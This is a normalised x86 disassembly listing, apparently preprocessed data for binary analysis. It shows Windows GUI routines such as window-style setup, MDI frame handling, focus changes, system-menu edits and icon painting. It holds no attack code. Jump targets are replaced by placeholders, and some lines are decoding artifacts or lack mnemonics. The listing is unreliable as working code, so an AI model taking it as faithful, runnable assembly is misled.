mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_440a84
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_457f55
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_455308
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_443c60
push eax
call SendMessageA
mov eax ebx
call sub_4588b4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_443c60
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43ce88
push eax
mov eax ebx
call sub_43cecc
push eax
mov eax ebx
call sub_443c60
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406984
mov [ ebx + 0x254 ] eax
push ebx
push sub_456ea0
call sub_41bb0c
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44dc40
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_443c60
push eax
call SetWindowPos
jmp r-xdata
sub_4580a2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4581cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_440de8
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45a5c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581d4
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_4581dc
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_441054
push 0x0
mov eax ebx
call sub_443c60
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_458220
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4417d8
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_443c60
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_443c60
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_458284
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45832c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458333
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax edi
call sub_454618
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403320
mov eax ebx
call sub_45863c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403320
test al al
jne r-xdata
sub_45833c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44073c
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44073c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_458284
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_458384
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_458284
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4583a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4142a4
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_414184
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4142a4
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_414184
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_458618
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_443c60
mov dx 0xb000
call sub_4543e0
test al al
jne r-xdata
call sub_443c60
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4543e0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45861f
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_40395c
jmp r-xdata
call sub_40395c
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44073c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_443c60
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4543e0
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43e62c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
call sub_40395c
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_443c60
mov dx 0xb01a
call sub_4543e0
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_40395c
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43e62c
sub_45863c
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43e62c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_443c60
push eax
call SetFocus
mov eax ebx
call sub_443c60
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45868c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43e62c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_458740
mov eax esi
call sub_45863c
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_444088
mov edx eax
mov eax esi
call sub_458284
sub_4586f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_457308
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43e62c
mov eax ebx
call sub_457308
mov edx esi
call sub_4586f0
sub_458740
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45176c
mov edx esi
call sub_451750
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4587e8
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_443c60
push eax
call SendMessageA
sub_458834
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4587e8
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_458864
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4587e8
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_4588d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41eaa0
xor eax eax
push ebp
push sub_45897e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41ee14
xor eax eax
push ebp
push sub_45895b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403320
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458962
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41ee14
retn
sub_45898c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_457308
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_45733c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403320
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_442f28
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_457388
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403320
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_458a2c
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_443c60
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_443c60
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_4588b4
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_443c60
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_441df0
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_458aaa
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41e680
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_458b0c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_443c60
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4420b4
pop edi
pop esi
retn
sub_458b58
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443c60
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_458c54
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45767c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_458b58
pop ecx
sub_458c88
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43eb48
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_443c60
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443c60
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_443c60
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43db20
pop esi
pop ebx
retn
sub_458d18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_443c60
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_442eb4
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_443c60
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45118c
sub_458d78
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_441f50
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_450ba0
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_458dc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_451400
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_458dfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_458e97
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458e9e
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_450b00
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45dbb8
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43a594
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45dbb8
jmp r-xdata
sub_458ec4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403320
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_458f04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cd10
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_458f30
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4586f0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_43a36c
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_458f88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_442d98
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45c56c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403320
sub_459014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_443c60
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_443c60
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_443c60
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4590ac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_443c60
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45868c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403320
sub_459104
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_444194
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_459130
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4586f0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45914c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_450b30
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
